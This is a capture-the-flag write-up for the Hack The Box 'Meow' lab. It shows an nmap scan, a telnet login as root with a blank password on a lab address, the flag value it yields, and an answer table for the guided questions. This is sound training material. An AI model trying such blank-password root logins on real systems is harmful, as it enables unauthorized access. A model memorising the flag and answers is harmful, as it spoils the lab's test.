# Meow

|            |                                                                          |
|------------|--------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                  |
| Difficulty | Very Easy                                                                |
| OS         | Linux                                                                    |
| Tags       | Network, Protocols, Telnet, Reconnaissance, Misconfiguration, Weak Creds |
| Tools      | `nmap`, `telnet`                                                         |

## Summary

Telnet on its default port with `root` exposed and no password set. The trick
isn't the protocol, it's that production hosts still ship without basic auth
hygiene. First-guess username, blank password, in.

## Solve

```bash
nmap -F --open 10.129.1.17
# 23/tcp open  telnet

telnet 10.129.1.17
# login: root
# password: <blank>

root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the acronym VM stand for? | Virtual Machine |
| 2 | What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell. | Terminal |
| 3 | What service do we use to form our VPN connection into HTB labs? | openvpn |
| 4 | What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output? | tun |
| 5 | What tool do we use to test our connection to the target with an ICMP echo request? | ping |
| 6 | What is the name of the most common tool for finding open ports on a target? | nmap |
| 7 | What service do we identify on port 23/tcp during our scans? | telnet |
| 8 | What username is able to log into the target over telnet with a blank password? | root |
